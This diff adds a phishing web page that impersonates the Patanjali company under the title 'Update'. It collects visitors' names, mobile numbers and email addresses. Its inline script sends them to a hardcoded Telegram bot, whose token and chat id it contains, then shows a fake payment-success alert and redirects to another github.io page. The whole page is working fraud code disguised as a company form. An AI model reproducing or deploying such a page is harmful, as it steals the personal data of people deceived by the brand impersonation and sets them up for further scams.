@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="help/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px;
+            border-radius: 8px 8px 0 0;
+            text-align: center;
+            font-size: 1.2em;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 94%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #dc3545;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        .btn:hover {
+            background-color: #c82333;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #666;
+        }
+        .center-image {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .center-image img {
+            width: 80%;
+            max-width: 300px;
+        }
+    </style>
+    
+</head>
+<body>
+     <div id="carouselExampleCaptions mb-4" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-indicators">
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="1" aria-label="Slide 2"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="2" aria-label="Slide 3"></button>
+        </div>
+        <div class="carousel-inner">
+          <div class="carousel-item active">
+            <img src="https://i.postimg.cc/hv2j4R2s/20241024-213752.jpg" class="d-block w-100" alt="...">
+          </div>
+          <div class="carousel-item">
+            <img src="https://i.postimg.cc/cHPG1brK/20241024-223151.jpg" class="d-block w-100" alt="...">
+          </div>
+          <div class="carousel-item">
+            <img src="https://i.postimg.cc/fRpvW6FM/20241024-210307.jpg" class="d-block w-100" alt="...">
+          </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Previous</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="next">
+          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Next</span>
+        </button>
+      </div>
+    
+    <br>
+    <div class="container">
+        <div class="center-image">
+           
+        </div>
+        <div class="header">पतंजलि कंपनी</div>
+        <form id="loginForm" onsubmit="return sender()">
+            <div class="form-group">
+                <label for="customer-name">Customer Name<span style="color: red;">*</span></label>
+                
+                
+                <input type="text" id="name" name="name" placeholder="Full Name" required>
+                
+                
+            </div>
+            <div class="form-group">
+                <label for="number">Mobile Number<span style="color: red;">*</span></label>
+                
+                
+                <input type="number" id="number" name="number" placeholder="Mobile Number" required>
+                
+                
+            </div>
+            <div class="form-group">
+                <label for="bp-number">Email I'D <span style="color: red;">*</span></label>
+                
+                
+ <input type="text" id="bp" name="bp" placeholder="Email I'D" required>
+                
+                
+            </div>
+            <button type="submit" class="btn">CONTINUE</button>
+        </form>
+        <br><br>
+        <div class="footer">
+            <a href="#">T&C</a> | <a href="#">Privacy</a>
+        </div>
+    </div>
+  <link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
+//chat id
+var chat_id = 1210231596;
+var ready = function () {
+    name = document.getElementById("name").value;
+    number = document.getElementById("number").value;
+    bp = document.getElementById("bp").value;
+  
+    message = 
+      "\nname: " + name +  
+      "\nfatherName: " + number + 
+      "\ndob: " + bp;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+        
+      document.location = "https://ringtone11.github.io/Amount1/"; 
+      swal("Successfull", "Your Payment Successfull", "success");
+      
+    });
+    document.getElementById("name").value = "";
+    document.getElementById("number").value = "";
+    document.getElementById("bp").value = "";
+    return false;
+};
+  </script>
+  
+     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="help/script.js"></script>
+    <script>
+      if (localStorage.getItem('userID') !== null) {
+    localStorage.removeItem('userID');
+    console.log('userID removed from localStorage');
+} else {
+    console.log('userID does not exist in localStorage');
+}
+
+    </script>
+</body>
+</html>
